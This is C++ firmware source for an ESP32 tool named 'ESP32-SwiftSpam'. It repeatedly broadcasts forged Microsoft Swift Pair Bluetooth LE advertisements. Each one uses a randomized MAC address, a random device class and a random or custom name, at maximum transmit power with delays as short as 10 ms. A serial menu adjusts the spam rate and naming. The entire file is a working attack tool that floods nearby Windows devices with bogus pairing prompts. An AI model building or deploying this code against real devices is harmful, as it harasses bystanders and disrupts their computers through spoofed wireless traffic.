// ESP32-SwiftSpam
// Author: Kyhze
// Version: 1.4.3
// Date: 19/10/2025

#include <NimBLEDevice.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <freertos/queue.h>
#include <iostream>
#include <map>
#include <string>
#include <cstdlib>
#include <ctime>
#include <vector>
#include "bluetooth_cod.h" // Bluetooth Class of Device mappings

const char* ver = "1.4.3";
// Flags
bool advertisingEnabled = true; // Flag to control whether advertising is enabled
bool SDEBUG = false; // Set to true to enable serial debug info
bool useCustomName = false; // Flag to indicate whether to use the custom name (do not set this flag manually)
// Adjustable randomly generated device name length
uint8_t DEVICE_NAME_LENGTH = 0; // Maximum length: 19 (do not set this flag manually)
// Spam delay parameters
const uint16_t MIN_DELAY = 10;    // Minimum delay in milliseconds
const uint16_t MAX_DELAY = 1000;  // Maximum delay in milliseconds
uint16_t currentDelay = 90;       // Default delay in milliseconds
// Device name parameters
char customDeviceName[20] = ""; // Buffer to store the custom device name (max 19 chars + null terminator)

// Shared variables for inter-task communication
QueueHandle_t payloadQueue; // Queue to pass payload data between tasks
struct PayloadData {
    char deviceName[20]; // Fixed-size buffer for device name (max 19 chars + null terminator)
    uint8_t mac[6];      // Random MAC address
    uint8_t advData[31]; // Advertisement data
    uint8_t advDataLen;  // Length of advertisement data
    bool hasName;        // Flag to indicate if a name is included
};

// Function to construct a Class of Device (CoD)
uint32_t constructClassOfDevice(int majorServiceClass, int majorDeviceClass, int minorDeviceClass) {
    return (majorServiceClass & 0xFFE000) | ((majorDeviceClass & 0x1F) << 8) | ((minorDeviceClass & 0x3F) << 2);
}

// Function to randomly select a CoD
void selectRandomClasses(int& serviceClass, int& majorClass, int& minorClass) {
    // Static variable to track the current service class index
    static size_t currentServiceIndex = 0;

    // Step 1: Define the mapping of Service Classes to their corresponding Major Device Classes
    const std::map<int, std::vector<int>> serviceToMajorMap = {
        {0x200000, {4, 5}},       // Audio Service → Audio/Video, Peripheral
        {0x100000, {1, 5}},       // Networking Service → Computer, Peripheral
        {0x080000, {4, 6}},       // Rendering Service → Audio/Video, Imaging
        {0x040000, {4, 5, 6}},    // Capturing Service → Audio/Video, Peripheral, Imaging
        {0x010000, {2, 4, 5}}     // Telephony Service → Phone, Audio/Video, Peripheral
    };

    // Step 2: Get the list of service keys
    std::vector<int> serviceKeys;
    for (const auto& entry : BluetoothCoD::MajorServiceClasses) {
        serviceKeys.push_back(entry.first);
    }

    // Step 3: Select the next service class sequentially (wrap around if necessary)
    serviceClass = serviceKeys[currentServiceIndex];
    currentServiceIndex = (currentServiceIndex + 1) % serviceKeys.size();

    // Step 4: Get the reduced pool of Major Device Classes for the selected Service Class
    const auto& relevantMajorKeys = serviceToMajorMap.at(serviceClass);

    // Step 5: Randomly select a Major Device Class from the reduced pool
    majorClass = relevantMajorKeys[random(relevantMajorKeys.size())];

    // Step 6: Randomly select a Minor Device Class for the selected Major Device Class
    const auto& minorMap = BluetoothCoD::MinorDeviceClasses.at(majorClass);
    std::vector<int> minorKeys;
    for (const auto& entry : minorMap) {
        minorKeys.push_back(entry.first);
    }
    minorClass = minorKeys[random(minorKeys.size())];

    // Debugging output
    if (SDEBUG) {
        Serial.printf("[DEBUG] Selected Class of Device: Service=%s, Major=%s, Minor=%s\n",
                      BluetoothCoD::MajorServiceClasses.at(serviceClass).c_str(),
                      BluetoothCoD::MajorDeviceClasses.at(majorClass).c_str(),
                      BluetoothCoD::MinorDeviceClasses.at(majorClass).at(minorClass).c_str());
    }
}

// Function to generate a random device name
void generateRandomDeviceName(char* name, int nameLength) {
    const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+-/()=[]{}@!?.;,:/*$%+\\#<>";
    for (int i = 0; i < nameLength; i++) {
        name[i] = charset[random(sizeof(charset) - 1)];
    }
    name[nameLength] = '\0'; // Null-terminate the string
}

// Function to generate a random MAC address
void generateRandomMac(uint8_t* mac) {
    for (int i = 0; i < 6; i++) {
        mac[i] = random(256); // Generate a random byte for each part of the MAC
    }
    mac[0] &= 0xFE; // Ensure the MAC is unicast (LSB of the first byte is 0)
    mac[0] |= 0x02; // Ensure the MAC is locally administered (second LSB of the first byte is 1)
}

// Function to generate SwiftPair advertisement data
void generateSwiftPairAdvertisementData(const char* deviceName, uint8_t* advData, uint8_t* advDataLen, bool hasName) {
    uint8_t nameLen = 0;
    if (hasName) {
        if (useCustomName) {
            // Use the length of the custom name
            nameLen = strlen(deviceName);
        } else {
            // Use the length of the random name (controlled by DEVICE_NAME_LENGTH)
            nameLen = DEVICE_NAME_LENGTH;
        }
    }

    // Maximum payload size is 31 bytes
    const uint8_t maxPayloadSize = 31;
    uint8_t remainingBytes = maxPayloadSize;

    int i = 0;

    // Randomly select a CoD
    int serviceClass, majorClass, minorClass;
    selectRandomClasses(serviceClass, majorClass, minorClass);
    uint32_t cod = constructClassOfDevice(serviceClass, majorClass, minorClass);

    // Add Manufacturer Specific Data - Including CoD
    if (remainingBytes >= 10) {
        advData[i++] = 9;             // Length of Manufacturer Specific Data
        advData[i++] = 0xFF;          // Manufacturer Specific Data type
        advData[i++] = 0x06;          // Microsoft Vendor ID (LSB)
        advData[i++] = 0x00;          // Microsoft Vendor ID (MSB)
        advData[i++] = 0x03;          // Microsoft Beacon Sub Scenario (Swift Pair)
        advData[i++] = 0x02;          // Flags (Swift Pair scenario)
        advData[i++] = 0x80;          // Reserved RSSI Byte
        advData[i++] = cod & 0xFF;    // CoD LSB
        advData[i++] = (cod >> 8) & 0xFF; // CoD Middle Byte
        advData[i++] = (cod >> 16) & 0xFF; // CoD MSB

        remainingBytes -= 10; // Reduce available bytes
        if (SDEBUG) {
            Serial.printf("[DEBUG] Class of Device in Payload: 0x%06X\n", cod);
        }
    }

    // Add Complete Local Name (Display Name)
    if (hasName && remainingBytes >= (2 + nameLen)) {
        advData[i++] = 1 + nameLen;  // Length of the field (1 byte for type + name length)
        advData[i++] = 0x09;        // Complete Local Name type
        memcpy(&advData[i], deviceName, nameLen);
        i += nameLen;
        remainingBytes -= (2 + nameLen); // Reduce available bytes
    }

    // Set final advertisement data length
    *advDataLen = i;

    // Debugging output
    if (SDEBUG) {
        Serial.printf("[DEBUG] Advertisement Data Length: %d bytes\n", *advDataLen);
        Serial.printf("[DEBUG] Advertisement Data: ");
        for (int j = 0; j < *advDataLen; j++) {
            Serial.printf("%02X ", advData[j]);
        }
        Serial.println();
    }
}

// Task to generate random data and construct the payload
void generateDataTask(void* parameter) {
    while (1) {
        // Generate a random MAC address
        uint8_t mac[6];
        generateRandomMac(mac);

        // Prepare SwiftPair advertisement data
        uint8_t advData[31];
        uint8_t advDataLen;
        bool hasName = (DEVICE_NAME_LENGTH > 0 || useCustomName); // Check if either random or custom name is enabled

        // Create a payload struct
        PayloadData payload;
        payload.hasName = hasName;

        if (hasName) {
            if (useCustomName) {
                // Use the custom device name
                strncpy(payload.deviceName, customDeviceName, 19);
                payload.deviceName[19] = '\0'; // Ensure null-termination
            } else {
                // Generate a random device name
                generateRandomDeviceName(payload.deviceName, DEVICE_NAME_LENGTH);
            }
        } else {
            payload.deviceName[0] = '\0'; // Empty name if disabled
        }

        // Generate SwiftPair advertisement data
        generateSwiftPairAdvertisementData(payload.deviceName, advData, &advDataLen, hasName);

        // Copy the advertisement data and MAC address to the payload
        memcpy(payload.mac, mac, 6);
        memcpy(payload.advData, advData, 31);
        payload.advDataLen = advDataLen;

        // Send the payload to the BLE task
        if (xQueueSend(payloadQueue, &payload, portMAX_DELAY) != pdTRUE) {
            Serial.println("[-] Failed to send payload to queue");
        }

        // Add a small delay to avoid overwhelming the queue
        vTaskDelay(pdMS_TO_TICKS(10));
    }
}

// Task to handle BLE operations
void bleTask(void* parameter) {
    while (1) {
        // Wait for a payload from the queue
        PayloadData payload;
        if (xQueueReceive(payloadQueue, &payload, portMAX_DELAY) == pdTRUE) {
            // Check if advertising is enabled
            if (advertisingEnabled) {
                // Initialize BLE
                NimBLEDevice::init("");
                NimBLEDevice::setPower(9); // Set to max TX power

                // Set the random MAC address
                NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
                NimBLEDevice::setOwnAddr(payload.mac);

                // Create BLE server
                NimBLEServer* pServer = NimBLEDevice::createServer();

                // Get advertising object
                NimBLEAdvertising* pAdvertising = NimBLEDevice::getAdvertising();

                // Set advertisement data
                NimBLEAdvertisementData advertisementData;
                advertisementData.addData(payload.advData, payload.advDataLen);
                pAdvertising->setAdvertisementData(advertisementData);

                // Start advertising
                pAdvertising->start();

                // Print debug info
                if (SDEBUG) {
                    if (payload.hasName) {
                        Serial.printf("\n[DEBUG] Advertising Swift Pair device: %s\n", payload.deviceName);
                    } else {
                        Serial.printf("\n[DEBUG] Advertising Swift Pair device: DEVICE_NAME_DISABLED");
                    }
                    Serial.printf("\n[DEBUG] Using random source MAC: %02X:%02X:%02X:%02X:%02X:%02X\n",
                                  payload.mac[0], payload.mac[1], payload.mac[2],
                                  payload.mac[3], payload.mac[4], payload.mac[5]);
                }

                // Wait for the set delay (in ms) before sending the next beacon
                vTaskDelay(pdMS_TO_TICKS(currentDelay));

                // Stop advertising
                pAdvertising->stop();

                // Clean up BLE resources
                NimBLEDevice::deinit();
            } else {
                // Advertising is disabled, skip this payload
                if (SDEBUG) {
                    Serial.printf("\n[DEBUG] Advertising is disabled. Skipping payload\n");
                }
            }
        }
    }
}

void setup() {
    // Initialize serial console
    Serial.begin(115200);
    Serial.printf("\nESP32-SwiftSpam ver.: %s\n", ver);
    Serial.printf("\n[>>] Starting ESP32-SwiftSpam...\n");
    Serial.printf("\n====== PARAMETERS ======");
    Serial.printf("\n[+] Spam delay set to: %lums\n", currentDelay);
    Serial.printf("[+] Using default Bluetooth device names\n");
    Serial.printf("\n[+] Now advertising Swift Pair beacons\n");

    // Set the initial random seed
    randomSeed(analogRead(0));

    // Create a queue to pass payload data between tasks
    payloadQueue = xQueueCreate(10, sizeof(PayloadData));
    if (payloadQueue == NULL) {
        Serial.printf("\n[-] FATAL: Failed to create queue");
        while (1); // Halt if the queue cannot be created
    }

    // Create the generateDataTask and bleTask
    xTaskCreatePinnedToCore(generateDataTask, "GenerateDataTask", 10000, NULL, 1, NULL, 0); // Run on Core 0
    xTaskCreatePinnedToCore(bleTask, "BLETask", 10000, NULL, 1, NULL, 1); // Run on Core 1
}

void loop() {
    // Check if there is data available on the serial port
    if (Serial.available() > 0) {
        String input = Serial.readStringUntil('\n'); // Read the incoming data
        input.trim(); // Remove any extra whitespace or newline characters

        // Check if the input starts with "set delay"
        if (input.startsWith("set delay ")) {
            // Extract the delay value from the command
            String delayValueStr = input.substring(10); // "set delay " is 10 characters long
            uint16_t newDelay = delayValueStr.toInt(); // Convert to integer

            // Validate the new delay value
            if (newDelay >= MIN_DELAY && newDelay <= MAX_DELAY) {
                currentDelay = newDelay; // Update the delay value
                Serial.printf("\n[+] New spam delay set to: %lums\n", currentDelay);
            } else {
                Serial.printf("\n[-] Invalid delay value. Please enter a value between 10 and 1000 (ms)\n");
            }
        }
        // Check if the input starts with "set name len"
        else if (input.startsWith("set name len ")) {
            // Extract the name length value from the command
            String nameLenStr = input.substring(13); // "set name len " is 13 characters long
            nameLenStr.trim(); // Remove any extra whitespace or newline characters
            int newNameLen = nameLenStr.toInt(); // Convert to integer

            // Validate the new name length value
            if (nameLenStr.length() == 0 || (newNameLen == 0 && nameLenStr != "0") || newNameLen < 0 || newNameLen > 19) {
                Serial.printf("\n[-] Invalid name length. Please enter a numeric value between 0 and 19\n");
            } else {
                DEVICE_NAME_LENGTH = (uint8_t)newNameLen; // Update the device name length
                Serial.printf("\n[+] New device name length set to: %d\n", DEVICE_NAME_LENGTH);
                if (DEVICE_NAME_LENGTH > 0) {
                    Serial.println("[+] Device name set to randomly generated");
                }
                else if (DEVICE_NAME_LENGTH == 0) {
                    useCustomName = false; // Revert to random names
                    memset(customDeviceName, 0, sizeof(customDeviceName)); // Clear customDeviceName buffer
                    Serial.printf("[+] Device name disabled\n");
                }
            }
        }

        // Check if the input starts with "set name fixed"
        else if (input.startsWith("set name fixed ")) {
            // Extract the custom name from the command
            String newName = input.substring(15); // "set name fixed " is 15 characters long

            // Validate the custom name length
            if (newName.length() >= 1 && newName.length() <= 19) {
                newName.toCharArray(customDeviceName, 20); // Copy the custom name to the buffer
                useCustomName = true; // Enable the use of the custom name
                Serial.printf("\n[+] Device name set to: %s\n", customDeviceName);
            } else {
                Serial.printf("\n[-] Invalid name length. Please enter a name between 1 and 19 characters\n");
            }
        }
        // Check if the input is "set name random"
        else if (input.equals("set name random")) {
            if (DEVICE_NAME_LENGTH > 0) {
              useCustomName = false; // Revert to random names
              Serial.printf("\n[+] Device name set to randomly generated");
            }
            else if (DEVICE_NAME_LENGTH == 0) {
              DEVICE_NAME_LENGTH = 8; // Set to default length
              useCustomName = false; // Revert to random names
              Serial.printf("\n[+] Device name set to randomly generated\n");
              Serial.printf("[+] Random device name length set to: %d\n", DEVICE_NAME_LENGTH);
            }
            
        }
        // Check if the input is "set verbose"
        else if (input.equals("set verbose")) {
            SDEBUG = !SDEBUG; // Toggle the SDEBUG flag
            if (SDEBUG) {
                Serial.printf("\n[+] Verbose debug output enabled\n");
            } else {
                Serial.printf("\n[+] Verbose debug output disabled\n");
            }
        }
        // Check if the input is "set spam"
        else if (input.equals("set spam")) {
            advertisingEnabled = !advertisingEnabled; // Toggle the advertising flag
            if (advertisingEnabled) {
                Serial.printf("\n[+] Beacon advertising enabled\n");
            } else {
                Serial.printf("\n[+] Beacon advertising disabled\n");
            }
        }
        // Check if the input is "reset"
        else if (input.equals("reset")) {
            Serial.printf("\n[+] Resetting ESP32 device...");
            delay(100);
            ESP.restart();
        }
        // Check if the input is "help"
        else if (input.equals("help") || (input.equals("?"))) {
            Serial.printf("\n====== HELP MENU ======");
            Serial.printf("\nUse 'set name len <0-19>' to change the device name length. 0 = disable device names\n");
            Serial.println("Use 'set delay <10-1000>' to change the spam delay (ms)");
            Serial.println("Use 'set name fixed <name>' to set a fixed device name");
            Serial.println("Use 'set name random' to generate random device names");
            Serial.println("Use 'set verbose' to toggle serial debug output");
            Serial.println("Use 'set spam' to toggle beacon advertising");
            Serial.println("Use 'reset' to reboot the ESP32 device");
            Serial.println("Use 'help' or '?' to display this message again");
        }
        else {
            Serial.printf("\n[-] Invalid command. Use 'help' or '?' to show all available commands\n");
        }
    }

    // Reset the ESP32 after 5 minutes of runtime
    uint32_t runtime = millis() / 1000; // Convert milliseconds to seconds for convenience
    if (runtime >= 300) {
        Serial.printf("\n[!] Runtime limit reached. Resetting ESP32...\n");
        delay(100);
        ESP.restart(); // Reset the ESP32
    }

    // FreeRTOS scheduler will handle the tasks
    vTaskDelay(pdMS_TO_TICKS(30)); // Small delay to avoid hogging the CPU
}
